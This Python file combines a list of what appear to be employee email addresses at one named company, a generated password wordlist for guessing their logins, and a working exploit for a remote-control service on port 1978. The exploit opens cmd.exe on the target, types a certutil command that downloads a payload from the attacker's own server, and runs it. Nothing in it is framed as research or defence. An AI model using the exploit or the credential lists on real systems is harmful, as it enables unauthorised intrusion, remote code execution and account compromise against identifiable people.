UserNames = """
laurensm@ql-robotics.com
laurensm@ql-robotics.com
borish@ql-robotics.com
borish@ql-robotics.com
dannym@ql-robotics.com
dannym@ql-robotics.com
antong@ql-robotics.com
antong@ql-robotics.com
nicolass@ql-robotics.com
nicolass@ql-robotics.com
maryl@ql-robotics.com
maryl@ql-robotics.com
jasperj@ql-robotics.com
jasperj@ql-robotics.com
lisag@ql-robotics.com
lisag@ql-robotics.com
"""
PassWords = """
description
description
fontawesome
fontawesome
crossorigin
crossorigin
anonymous
anonymous
googleapis
googleapis
Montserrat
Montserrat
stylesheet
stylesheet
googleapis
googleapis
stylesheet
stylesheet
bootstrap
bootstrap
stylesheet
stylesheet
qwerty123
qwerty123
container
container
navigation
navigation
uppercase
uppercase
123456789
123456789
container
container
subheading
subheading
uppercase
uppercase
uppercase
uppercase
container
container
uppercase
uppercase
engineering
engineering
engineers
engineers
knowledge
knowledge
different
different
engineering
engineering
aeronautical
aeronautical
electronics
electronics
electrical
electrical
mechanical
mechanical
engineering
engineering
consultancy
consultancy
imaginable
imaginable
technical
technical
implementation
implementation
frameworks
frameworks
engineers
engineers
interplay
interplay
cyberspace
cyberspace
container
container
uppercase
uppercase
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
subheading
subheading
engineering
engineering
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
subheading
subheading
engineering
engineering
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
frameworks
frameworks
portfolio
portfolio
subheading
subheading
consultancy
consultancy
container
container
uppercase
uppercase
subheading
subheading
following
following
identification
identification
candidate
candidate
university
university
solutions
solutions
identification
identification
organization
organization
container
container
uppercase
uppercase
consultant
consultant
consultant
consultant
container
container
container
container
uppercase
uppercase
API_TOKEN
API_TOKEN
placeholder
placeholder
validations
validations
placeholder
placeholder
validations
validations
placeholder
placeholder
validations
validations
placeholder
placeholder
validations
validations
submission
submission
successful
successful
startbootstrap
startbootstrap
startbootstrap
startbootstrap
uppercase
uppercase
container
container
copyright
copyright
decoration
decoration
decoration
decoration
portfolio
portfolio
portfolio
portfolio
portfolio
portfolio
container
container
uppercase
uppercase
implementation
implementation
portfolio
portfolio
identification
identification
civilians
civilians
enforcement
enforcement
implementations
implementations
technology
technology
receivers
receivers
confidential
confidential
engineering
engineering
uppercase
uppercase
portfolio
portfolio
portfolio
portfolio
container
container
uppercase
uppercase
portfolio
portfolio
proprietary
proprietary
implementation
implementation
technology
technology
receiving
receiving
implementation
implementation
Raspberry
Raspberry
perfectly
perfectly
demonstration
demonstration
engineering
engineering
uppercase
uppercase
portfolio
portfolio
portfolio
portfolio
container
container
uppercase
uppercase
frameworks
frameworks
portfolio
portfolio
frameworks
frameworks
regulation
regulation
countries
countries
worldwide
worldwide
implementation
implementation
technologies
technologies
implementations
implementations
uppercase
uppercase
bootstrap123
bootstrap123
bootstrap
bootstrap
bootstrap
bootstrap
startbootstrap
startbootstrap
startbootstrap
startbootstrap
copyright
copyright
webdesign
webdesign
strato_NL
strato_NL
information
information
jolles909
jolles909
"""

"""def main(usernames : str, passwords: str)->str:
    
    unique_potential_passwords: set = set(passwords.split('\n'))
    unique_user_names: set          = set(usernames.split("@ql-robotics.com\n"))


    
    return f'UserNames: {'\n'.join(unique_user_names)}\n\nPassWords:{'\n'.join(unique_potential_passwords)}'
"""
from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
import sys
import string

target = socket(AF_INET, SOCK_STREAM)
port = 1978

try:
	rhost = sys.argv[1]
	lhost = sys.argv[2]
	payload = sys.argv[3]
except:
	print("USAGE: python " + sys.argv[0]+ " <target-ip> <local-http-server-ip> <payload-name>")
	exit()


characters={
	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
	"O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
	"o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
	" ":"20","+":"2b","=":"3d","/":"2f","_":"5f","<":"3c",
	">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26","*":"2a",
	"(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
	"\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"}


def openCMD():
	target.sendto("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a".decode("hex"), (rhost,port)) # openfile /C/Windows/System32/cmd.exe

def SendString(string):
	for char in string:
		target.sendto(("7574663820" + characters[char] + "0a").decode("hex"),(rhost,port)) # Sends Character hex with packet padding
		sleep(0.03)

def SendReturn():
	target.sendto("6b657920203352544e".decode("hex"),(rhost,port)) # 'key 3RTN' - Similar to 'Remote Mouse' mobile app
	sleep(0.5)

def exploit():
	print("[+] 3..2..1..")
	sleep(2)
	openCMD()
	print("[+] *Super fast hacker typing*")
	sleep(1)
	SendString("certutil.exe -urlcache -f http://" + lhost + "/" + payload + " C:\\Windows\\Temp\\" + payload)
	SendReturn()
	print("[+] Retrieving payload")
	sleep(3)
	SendString("C:\\Windows\\Temp\\" + payload)
	SendReturn()
	print("[+] Done! Check Your Listener?")


def main():
	target.connect((rhost,port))
	exploit()
	target.close()
	exit()

if __name__=="__main__":
	main()

